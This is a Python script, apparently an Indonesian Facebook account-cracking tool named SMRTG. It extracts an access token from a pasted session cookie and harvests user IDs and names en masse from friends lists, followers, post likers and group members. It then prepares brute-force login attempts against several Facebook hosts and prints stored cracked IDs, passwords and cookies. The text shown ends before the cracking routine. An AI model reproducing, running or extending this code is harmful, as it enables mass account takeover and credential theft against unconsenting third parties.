#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author : Mhd Syafii
# SC Gratis
#-----------[MODULE IMPORT]-----------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')

#----------[BAGIAN USER-AGENT]-------------#
pretty.install()
CON=sol()
cokbrut=[]
ses=requests.Session()
princp=[]
ugen2=open('Ua/ugent2.txt','r').read().splitlines()
ugen=open('Ua/ugent.txt','r').read().splitlines()
prox=open('.proxy.txt','r').read().splitlines()
#try:
#	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
#	open('.prox.txt','w').write(prox)
#except Exception as e:
#	print('GAGAL')

#-------------[BAGIAN INDIVIDU]------------#
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[]
lisensiku=['sukses']
cokbrut=[]
pwpluss,pwnya=[],[]

# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

#----------[ ANSII COLOR STYLE ]---------- #
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

#----------[ RICH COLOR STYLE ]------------#
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu


#----------[ RICH COLOR STYLE ]------------#
HT = "#000000" # Hitam
MR = "#FF0000" # Merah
HJ = "#00FF00" # Hijau
KK = "#FFFF00" # Kuning
BB = "#00C8FF" # Biru
UU = "#AF00FF" # Ungu
PK = "#FF00FF" # Pink
BM = "#00FFFF" # Biru Muda
PP = "#FFFFFF" # Putih
JG = "#FF8F00" # Jingga
AA = "#AAAAAA" # Abu-Abu

#-------------[MEMBUAT BULAN DAN BINTANG]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#---------------[PEMBERSIH]---------------#
def clear():
	os.system('clear')
#----------------[gntebg]-------------#
def fikri_xy(u):
  for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
#-----------------[BACK]--------------#
def back():
	login()

#-----------[MEMBUAT LOGO]----------#
def banner():
	clear()
	wel='# SELAMAT DATANG DI SMRTG(2023)'
	cik2=mark(wel ,style='cyan')
	sol().print(cik2)
	ban=''' • AUTHOR : MHD SYAFII • 
• ____  __  __ ____ _____ ____
/ ___||  \/  |  _ \_   _/ ___|
\___ \| |\/| | |_) || || |  _
 ___) | |  | |  _ < | || |_| |
   |____/|_|  |_|_| \_\|_| \____| • VERSION 15.1.1 • 
   GITHUB : HTTPS://GITHUB.COM/SYAFII-XD/SMRTG'''
	oi = nel(tekz(ban,justify='center',style=f'{PK}'), style=f'{JG}')
	cetak(nel(oi, title=f'{N2} • INFORMASI AUTHOR • {N2}'))
   
# VALIDASI TOKEN
def login():
		try:
			token = open('.token.txt','r').read()
			kukis = open('.cok.txt','r').read()
			tokenku.append(token)
			cokbrut.append(kukis)
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				menu(sy2,sy3)
			except KeyError:
				login_lagi334()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_lagi334()

# LOGIN
def login_lagi334():
	try:
		banner()
		cetak(nel('[#AF00FF] Jangan Menggunakan Akun Tumbal Anda, Fitur Ini Login Menggunakan Cookies,[#AF00FF]Jangan Lupa Followers Iya Github Saya • TERIMA KASIH •[#FF8F00]'))
		___kontol___ = input('[!] Masukkan Cookies : ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(___kontol___)
		print('\nLOGIN BERHASIL  --->jalankan ulang ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print('%s# LOGIN GAGAL ! COOKIE TIDAK VALID ! '%(h))
		exit()

# MENU
def menu(my_name,my_id):
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
	sg = '# •• INFORMASI PENGGUNA ••'
	fx = mark(sg, style='green')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] USER NAME : '+str(my_name))
	print(x+'['+h+'•'+x+'] USER ID     : '+str(my_id))
	print(x+'['+h+'•'+x+'] IP ADDRESS  : '+str(sh['origin']))
	io = f'''{P2}[{J2}01{P2}]. crack dari id publik\n[{J2}02{P2}]. crack dari id publik (massal)\n[{J2}03{P2}]. crack dari Followers\n[{J2}04{P2}]. crack dari likes\n[{J2}05{P2}]. crack Dari Grub\n[{J2}06{P2}]. crack dari file\n[{J2}07{P2}]. cek akun checkpoint\n[{J2}08{P2}]. cek hasil akun crack\n[{J2}09{P2}]. Hubungi author\n[{M2}00{P2}]. Keluar'''
	oi = nel(io, style=f'{AA}')
	cetak(nel(oi, title=f'{N2} • MENU CRACK • {N2}'))
	ec = input(x+'['+p+'<>'+x+'] Pilih : ')
	if ec in ['1','01']:
		dump_publik()
	elif ec in ['2','02']:
		dump_massal()
	elif ec in ['3','03']:
		dump_pengikut()
	elif ec in ['4','04']:
		dump_likes()
	elif ec in ['5','05']:
		dump_grup()
	elif ec in ['6','06']:
		crack_file()
	elif ec in ['7','07']:
		file()
	elif ec in ['8','08']:
		result()
	elif ec in ['9','09']:
		tipsx()
	elif ec in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print(x+'['+h+'•'+x+'] LOADING • • •')
		time.sleep(1)
		sw = '# SUCCESS OUT'
		sol().print(mark(sw, style='cyan'))
		exit()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()

# RESULT CHECKER
def result():
	cek = '# CEK HASIL CRACK'
	sol().print(mark(cek, style=f'{PK}'))
	kayes = f'{J2}[01] Cek Hasil Akun CP\n[02] Cek Hasil Akun OK\n[00] Kembali{J2}'
	kis = nel(kayes, style=f'{AA}')
	cetak(nel(kis, title='HASIL'))
	kz = input(x+'['+p+'f'+x+'] Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# ISI YANG BENAR BG'
			sol().print(mark(gada, style=f'{MR}'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# TIDAK PUNYA AKUN CP'
			sol().print(mark(haha, style=f'{JG}'))
			time.sleep(2)
			back()
		else:
			gerr = '# AKUN CP'
			sol().print(mark(gerr, style=f'{JG}'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# PILIH HASIL UNTUK MENUNJUKKAN'
			sol().print(mark(gerr2, style=f'{PK}'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPSI TIDAK DI TEMUKAN'
				sol().print(mark(ric, style=f'{MR}'))
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA DAN COBA LAGI'
				sol().print(mark(hehe, style=f'{MR}'))
				time.sleep(2)
				back()
			akun = '# HASIL AKUN CP ANDA'
			sol().print(mark(akun, style=f'{JG}'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style=f"{KK}"))
				nocp +=1
			akun2 = '# HASIL AKUN CP ANDA'
			sol().print(mark(akun, style=f'{KK}'))
			input('[TEKAN ENTER UNTUK KEMBALI]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '# PENYIMPANAN TIDAK DITEMUKAN '
			sol().print(mark(gada, style=f'{MR}'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA TIDAK MEMILIKI HASIL YANG OK'
			sol().print(mark(haha, style=f'{MR}'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL ANDA OK'
			sol().print(mark(gerr, style=f'{HJ}'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# PILIH HASIL UNTUK MENUNJUKKAN'
			sol().print(mark(gerr2, style=f'{AA}'))
			geeh = input(x+'['+p+'f'+x+'] Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPSI TIDAK DI TEMUKAN'
				sol().print(mark(ric, style=f'{MR}'))
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA DAN COBA LAGI'
				sol().print(mark(hehe, style=f'{MR}'))
				time.sleep(2)
				back()
			akun = '# HASIL AKUN OK ANDA'
			sol().print(mark(akun, style=f'{JG}'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style=f"{HJ}"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			akun2 = '# HASIL AKUN ANDA OK'
			sol().print(mark(akun, style=f'{JG}'))
			input('[TEKAN ENTER UNTUK KEMBALI]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# OPSI TIDAK DI TEMUKAN'
		sol().print(mark(ric, style=f'{MR}'))
		exit()

# OPEN
def file():
	tek = '# PERIKSA CEKPOINT DARI FILE'
	sol().print(mark(tek, style=f'{AA}'), style=f'{JG}')
	print(x+'['+h+'•'+x+'] MEMBACA FILE, TUNGGU SATU MENIT •••')
	time.sleep(2)
	teks = '# PILIH FILE YANG AKAN DIPERIKSA'
	sol().print(mark(teks, style=f'{AA}'))
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA TIDAK MEMILIKI HASIL UNTUK MEMERIKSA'
		sol().print(mark(yy, style=f'{MR}'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		teks2 = '# PILIH FILE YANG AKAN DIPERIKSA'
		sol().print(mark(teks2, style=f'{AA}'))
		geeh = input(x+'['+p+'f'+x+'] Choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPSI TIDAK DI TEMUKAN'
			sol().print(mark(ric, style=f'{MR}'))
			exit()
		try:
			hf = open('1CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA DAN COBA LAGI'
				sol().print(mark(hehe, style=f'{MR}'))
				time.sleep(2)
				back()

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	win = '# ID PUBLIK DUMP'
	win2 = mark(win, style=f'{JG}')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] KETIK "ME" JIKA INGIN DUMP DARI TEMAN ANDA')
	pil = input(x+'['+p+'f'+x+'] INPUT TARGET ID : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'/friends?fields=id,name&limit=5000&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# MASALAH KONEKSI INTERNET, PERIKSA DAN COBA LAGI'
		lo = mark(li, style=f'{MR}')
		sol().print(lo, style=f'{JG}')
		exit()
	except (KeyError,IOError):
		teks = '# BUKAN PERTEMENAN PUBLIK'
		teks2 = mark(teks, style=f'{MR}')
		sol().print(teks2)
		login()

# DUMP ID MASSAL
def dump_massal():
	mas='[01] CRACK MASSAL DARI FILE\n[02] CRACK MASSAL MANUAL'
	mas2=nel(mas,style=f'{JG}')
	cetak(nel(mas2,title=' • MENU MASSAL •'))
	pilih=input('[•] Choose : ')
	if pilih in ['1','01']:
		nmfil=input('[•] File Name : ')
		nmfile=open(nmfil,'r').read().splitlines()
		for xfil in nmfile:
			uid.append(xfil)
	elif pilih in ['2','02']:
		print(x+'['+h+'•'+x+'] MASUKKAN TOTAL BATAS ID [20]')
		try:
			jum = int(input(x+'['+p+'f'+x+'] Number Of Id : '))
		except ValueError:
			pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
			pesan2 = mark(pesan, style=f'{MR}')
			sol().print(pesan2)
			exit()
		if jum<1 or jum>20:
			pesan = '# DI LUAR JANGKAUAN LIMIT'
			pesan2 = mark(pesan, style=f'{MR}')
			sol().print(pesan2)
			exit()
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'•'+x+'] KETIK "ME" JIKA INGIN DUMP DARI TEMAN ANDA')
		for met in range(jum):
			yz+=1
			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
			uid.append(kl)
	sed='# SEDANG MEMGUMPULKAN USER ID'
	sol().print(mark(sed, style=f'{JG}'))
	ses=requests.Session()
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/'+userr+'/friends?fields=id,name&limit=5000&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# MASALAH KONEKSI INTERNET, PERIKSA DAN COBA LAGI'
			lo = mark(li, style=f'{MR}')
			sol().print(lo, style=f'{JG}')
			exit()
	tot = '# SUKSES MENGUMPULKAN  %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style=f'{MR}')
	else:
		tot2 = mark(tot, style=f'{PK}')
	sol().print(tot2)
	setting()

#DUMP PENGIKUT
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	mas='[01] CRACK MASSAL DARI FILE\n[02] CRACK MASSAL MANUAL'
	mas2=nel(mas,style=f'{JG}')
	cetak(nel(mas2,title=' • MENU MASSAL •'))
	pilih=input('[•] Choose : ')
	if pilih in ['1','01']:
		nmfil=input('[•] File Name : ')
		nmfile=open(nmfil,'r').read().splitlines()
		for xfil in nmfile:
			uid.append(xfil)
	elif pilih in ['2','02']:
		print(x+'['+h+'•'+x+'] MASUKKAN TOTAL BATAS ID [20]')
		try:
			jum = int(input(x+'['+p+'f'+x+'] Number Of Id : '))
		except ValueError:
			pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
			pesan2 = mark(pesan, style=f'{MR}')
			sol().print(pesan2)
			exit()
		if jum<1 or jum>20:
			pesan = '# DI LUAR JANGKAUAN LIMIT'
			pesan2 = mark(pesan, style=f'{MR}')
			sol().print(pesan2)
			exit()
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'•'+x+'] KETIK "ME" JIKA INGIN DUMP DARI TEMAN ANDA')
		for met in range(jum):
			yz+=1
			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
			uid.append(kl)
	sed='# SEDANG MEMGUMPULKAN USER ID'
	sol().print(mark(sed, style=f'{JG}'))
	ses=requests.Session()
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
			for mi in col['subscribers']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# MASALAH KONEKSI INTERNET, PERIKSA DAN COBA LAGI'
			lo = mark(li, style=f'{MR}')
			sol().print(lo, style=f'{JG}')
			exit()
	tot = '# SUKSES MENGUMPULKAN  %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style=f'{MR}')
	else:
		tot2 = mark(tot, style=f'{PK}')
	sol().print(tot2)
	setting()

#DUMP LIKES
def dump_likes():
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cok.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID DARI LIKERS'
	win2 = mark(win, style=f'{JG}')
	sol().print(win2)
	pil = input(x+'['+p+'f'+x+'] INPUT ID POST : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v5.0/'+pil+'?fields=likes.limit(10000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['likes']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# MASALAH KONEKSI INTERNET, PERIKSA DAN COBA LAGI'
		lo = mark(li, style=f'{MR}')
		sol().print(lo, style=f'{PK}')
		exit()
	except (KeyError,IOError):
		teks = '# GAGAL DUMP ATAU TOKEN FAILED'
		teks2 = mark(teks, style=f'{MR}')
		sol().print(teks2)
		exit()

#DUMPS GRUP
def dump_grup():
	au = '# PASTIKAN ID GROUP PUBLIK BUKAN PRIVATE'
	au2 = mark(au, style=f'{JG}')
	sol().print(au2)
	idgrup = input("[•] INPUT ID/USERNAME GRUP : ")
	link = "https://mbasic.facebook.com/groups/"+idgrup
	ses = requests.Session()
	try:
		res = sop(ses.get(link, headers={"user-agent": 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'}).text, "html.parser")
	except requests.exceptions.ConnectionError:
		au = '# MASALAH KONEKSI INTERNET, PERIKSA DAN COBA LAGI'
		au2 = mark(win, style=f'{MR}')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	titt = res.find("title")
	titt2 = titt.text.replace(" | Facebook","").replace(" Grup Publik","")
	if titt2=='Masuk Facebook':
		au = '# BATAS MODE OFF PESAWAT & COBA LAGI'
		au2 = mark(win, style=f'{MR}')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	elif titt2=='Kesalahan':
		au = '# GROUP NOT FOUND'
		au2 = mark(win, style='yellow')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	else:pass
	xxb = res.find_all('table')
	totid = []
	for xb in xxb:
		totalid = xb.text
		tottalid = totalid.replace('Anggota','')
		try:
			jumid = int(tottalid)
			totid.append(jumid)
		except:
			pass
	au = 'GROUP NAME    : '+titt2+'\n'+'GROUP MEMBER : '+str(totid[0])
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • GROUP TARGET •[/bold cyan]'))
	au = '[•] TO STOP PRESS CTRL+C\n[•] IF STUCK ON OF AIRPLANE MODE'
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • SUGGESTION •[/bold cyan]'))
	linkm='https://mbasic.facebook.com/browse/group/members/?id='+idgrup
	pulkanid(linkm)
def pulkanid(linkmem):	
	member=ses.get(linkmem,cookies={'cookie': cokbrut[0]},headers={'user_agent': ''}).text
	memberr=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',member)
	for mem in memberr:
		if "profile.php?" in mem[0]:
			id.append(re.findall("id=(.*)",mem[0])[0]+"|"+mem[1])
		else:
			id.append(mem[0]+"|"+mem[1])
		sys.stdout.write('\r [•] COLLECTING  %s ID'%(len(id))); sys.stdout.flush()
	if "Lihat Selengkapnya" in member:
		time.sleep(2)
		pulkanid('https://mbasic.facebook.com'+sop(member,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
	else:
		def geh(gey):
			try:
				a=requests.get(gey,cookies={'cookie': cokbrut[0]}).text
				b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
				if len(b)!=0:
					for c in b:
						if "profile.php" in c[0]:
							d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"|"+c[1])
						else:
							d=re.search("(.*?)\?refid",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"|"+c[1])
						sys.stdout.write('\r  [•] COLLECTING %s ID'%(len(id))); sys.stdout.flush()
				if "Lihat Postingan Lainnya" in a:
					geh('https://mbasic.facebook.com'+sop(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				else:
					print('\n')
					setting()
			except requests.exceptions.ConnectionError:
				time.sleep(15)
				geh(gey)
			except KeyboardInterrupt:
				print('\n')
				setting()
		geh(f"https://mbasic.facebook.com/groups/"+re.search("id=(\\d*)",linkmem).group(1))
def crack_file():
	cek = '# CRACK FROM FILE DUMP'
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
		back()
	if len(vin)==0:
		haha = '# YOU DONT HAVE FILE DUMP RESULTS'
		sol().print(mark(haha, style='yellow'))
		time.sleep(2)
		back()
	else:
		gerr = '# YOUR FILE DUMP RESULT'
		sol().print(mark(gerr, style='cyan'))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		gerr2 = '# SELECT RESULTS TO START CRACK'
		sol().print(mark(gerr2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
def tipsx():
	print('NEXT UPDATE BRO')
	
# PENGATURAN ID
def setting():
	wl = '# PENGATURAN URUTAN ID'
	sol().print(mark(wl, style=f'{JG}'))
	teks = f'[{J2}01{P2}]. crack dari akun terlama\n[{J2}02{P2}]. crack dari akun termuda\n[{J2}03{P2}]. crack dari akun random'
	tak = nel(teks, style=f'{PK}')
	cetak(nel(tak, title=' • PENGATURAN • '))
	hu = input(x+'['+p+'f'+x+'] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# OPSI TIDAK DI TEMUKAN'
		sol().print(mark(ric, style='red'))
		exit()
	met = '# PILIH URL LOGIN'
	sol().print(mark(met, style=f'{JG}'))
	ioz = f'[{J2}01{P2}]. m.facebook.com\n[{J2}02{P2}]. free.facebook.com\n[{J2}03{P2}]. touch.facebook.com\n[{J2}04{P2}]. mbasic.facebook.com'
	gess = nel(ioz, style=f'{JG}')
	cetak(nel(gess, title=' • URL LOGIN • '))
	fii = input(x+'['+p+'f'+x+'] Pilih : ')
	if fii in ['1','01']:
		open('tool/url_login.txt','w').write("m.facebook.com")
	elif fii in ['2','02']:
		open('tool/url_login.txt','w').write("free.facebook.com")
	elif fii in ['3','03']:
		open('tool/url_login.txt','w').write("touch.facebook.com")
	elif fii in ['4','04']:
		open('tool/url_login.txt','w').write("mbasic.facebook.com")
	else:
		open('tool/url_login.txt','w').write("m.facebook.com")
	met = '# PILIH METHODE CRACK'
	sol().print(mark(met, style=f'{JG}'))
	ioz = f'[{J2}01{P2}]. methode validate\n[{J2}02{P2}]. methode reguler\n[{J2}03{P2}]. methode graph\n[{J2}04{P2}]. methode api'
	gess = nel(ioz, style='cyan')
	cetak(nel(gess, title=' • METHOD • '))
	hc = input(x+'['+p+'f'+x+'] Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	guw = '# tampilkan aplikasi terkait ? (y/t)'
	sol().print(mark(guw, style=f'{JG}'))
	aplik = input(x+'['+p+'f'+x+'] Pilih : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
